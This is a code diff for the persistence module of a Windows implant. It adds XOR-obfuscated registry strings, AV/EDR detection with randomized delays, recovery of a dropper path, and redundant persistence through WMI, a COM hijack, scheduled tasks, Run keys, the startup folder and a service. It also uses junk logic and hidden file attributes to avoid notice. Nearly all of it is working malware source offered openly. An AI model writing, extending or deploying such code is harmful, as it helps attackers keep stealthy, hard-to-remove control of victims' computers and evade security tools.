@@ -21,6 +21,17 @@ namespace persistence {
 
 namespace {
 
+// XOR encrypted (0x5A)
+// "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
+std::wstring kShellFolders = L"\x09\x35\x3C\x2E\x2D\x3B\x28\x3F\x06\x17\x33\x39\x28\x35\x29\x35\x3C\x2E\x06\x0D\x33\x34\x3E\x35\x2D\x29\x06\x19\x2F\x28\x28\x3F\x34\x2E\x0C\x3F\x28\x29\x33\x35\x34\x06\x1F\x22\x2A\x36\x35\x28\x3F\x28\x06\x09\x32\x3F\x36\x36\x7A\x1C\x35\x36\x3E\x3F\x28\x29";
+// "Startup"
+std::wstring kStartupVal = L"\x09\x2E\x3B\x28\x2E\x2F\x2A";
+
+// "Volatile Environment"
+std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
+// "DropperPath"
+std::wstring kDropperPathVal = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
+
 void JunkLogic() {
     volatile int x = 0;
     for (int i = 0; i < 1000; i++) {
@@ -128,6 +139,45 @@ bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& nam
     return true;
 }
 
+bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& name) {
+    std::wstring cmd = L"/create /f /tn \"" + name + L"\" /tr \"" + implantPath + L"\" /sc logon /rl highest";
+    HINSTANCE res = ShellExecuteW(NULL, L"open", L"schtasks.exe", cmd.c_str(), NULL, SW_HIDE);
+    return (INT_PTR)res > 32;
+}
+
+bool InstallService(const std::wstring& implantPath, const std::wstring& name) {
+    if (!utils::IsAdmin()) return false;
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) return false;
+    SC_HANDLE hService = CreateServiceW(hSCM, name.c_str(), name.c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
+    if (!hService) {
+        hService = OpenServiceW(hSCM, name.c_str(), SERVICE_ALL_ACCESS);
+    }
+    if (hService) {
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return true;
+    }
+    CloseServiceHandle(hSCM);
+    return false;
+}
+
+bool InstallStartup(const std::wstring& implantPath, const std::wstring& name) {
+    HKEY hKey;
+    std::wstring startupPath;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kShellFolders).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t path[MAX_PATH];
+        DWORD sz = sizeof(path);
+        if (RegQueryValueExW(hKey, utils::DecryptW(kStartupVal).c_str(), NULL, NULL, (LPBYTE)path, &sz) == ERROR_SUCCESS) {
+            startupPath = path;
+        }
+        RegCloseKey(hKey);
+    }
+    if (startupPath.empty()) return false;
+    std::wstring target = startupPath + L"\\" + name + L".exe";
+    return CopyFileW(implantPath.c_str(), target.c_str(), FALSE) != 0;
+}
+
 void CreateDirectoryRecursive(const std::wstring& path) {
     size_t lastSlash = path.find_last_of(L"\\");
     if (lastSlash != std::wstring::npos) {
@@ -147,23 +197,45 @@ void CreateDirectoryRecursive(const std::wstring& path) {
 
 std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
     JunkLogic();
-    std::wstring sourcePath = overrideSourcePath.empty() ? getExecutablePath() : overrideSourcePath;
+
+    if (evasion::Detection::IsAVPresent()) {
+        LOG_WARN("AV/EDR detected. Delaying persistence...");
+        Sleep(60000 + (GetTickCount() % 120000));
+    }
+
+    std::wstring sourcePath = overrideSourcePath;
+    if (sourcePath.empty()) {
+        sourcePath = getExecutablePath();
+        // If we are in explorer.exe, try to recover the dropper path from registry
+        std::wstring current = sourcePath;
+        for (auto& c : current) c = (wchar_t)::towlower(c);
+        if (current.find(L"explorer.exe") != std::wstring::npos || current.find(L"runtimebroker.exe") != std::wstring::npos) {
+            HKEY hKey;
+            if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                wchar_t buf[MAX_PATH];
+                DWORD sz = sizeof(buf);
+                if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPathVal).c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
+                    sourcePath = buf;
+                }
+                RegCloseKey(hKey);
+            }
+        }
+    }
+
     PersistTarget target = getRandomTarget();
 
     // Check if we are already in one of the possible persist targets
     wchar_t currentPathBuf[MAX_PATH];
     GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
     std::wstring currentPath(currentPathBuf);
-    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
+    for (auto& c : currentPath) c = (wchar_t)::towlower(c);
 
-    std::wstring targetPathLower = target.path;
-    std::transform(targetPathLower.begin(), targetPathLower.end(), targetPathLower.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
-
-    if (currentPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos ||
-        currentPath.find(L"\\microsoft\\teams\\") != std::wstring::npos ||
-        currentPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) {
-        LOG_INFO("Running from persistence path.");
-        return currentPathBuf;
+    if (currentPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
+        currentPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
+        if (currentPath.find(L"\\temp\\") == std::wstring::npos) {
+            LOG_INFO("Already running from persistence.");
+            // Even if running from persistence, we continue to re-assert all methods
+        }
     }
 
     CreateDirectoryRecursive(target.path);
@@ -177,26 +249,37 @@ std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
 
     if (copied) {
         SetFileAttributesStealth(target.path);
-        LOG_INFO("Binary copied to " + utils::ws2s(target.path));
+        LOG_INFO("Binary at " + utils::ws2s(target.path));
     } else {
-        LOG_ERR("Failed to copy binary.");
-        return L"";
+        LOG_ERR("Copy failed.");
+        if (currentPath == sourcePath) {
+             LOG_INFO("Source is current, proceed with registration.");
+             target.path = currentPath;
+        } else {
+             return L"";
+        }
     }
 
-    // Stealth: Delayed persistence installation
-    Sleep(30000);
+    // Install ALL methods for redundancy
+    Sleep(15000);
+    if (WmiPersistence::Install(target.path, target.name)) LOG_INFO("WMI ok.");
 
-    // 1. COM Hijack
+    Sleep(15000);
     std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
-    if (ComHijacker::Install(target.path, clsid)) {
-        LOG_INFO("P1 set.");
-    }
+    if (ComHijacker::Install(target.path, clsid)) LOG_INFO("COM ok.");
 
-    Sleep(30000);
+    Sleep(15000);
+    if (InstallSchtasks(target.path, target.name)) LOG_INFO("Task ok.");
 
-    // 2. Registry Run
-    if (InstallRegistryRun(target.path, target.name)) {
-        LOG_INFO("P2 set.");
+    Sleep(15000);
+    if (InstallRegistryRun(target.path, target.name)) LOG_INFO("Reg ok.");
+
+    Sleep(15000);
+    if (InstallStartup(target.path, target.name)) LOG_INFO("Startup ok.");
+
+    if (utils::IsAdmin()) {
+        Sleep(15000);
+        if (InstallService(target.path, target.name)) LOG_INFO("Svc ok.");
     }
 
     return target.path;
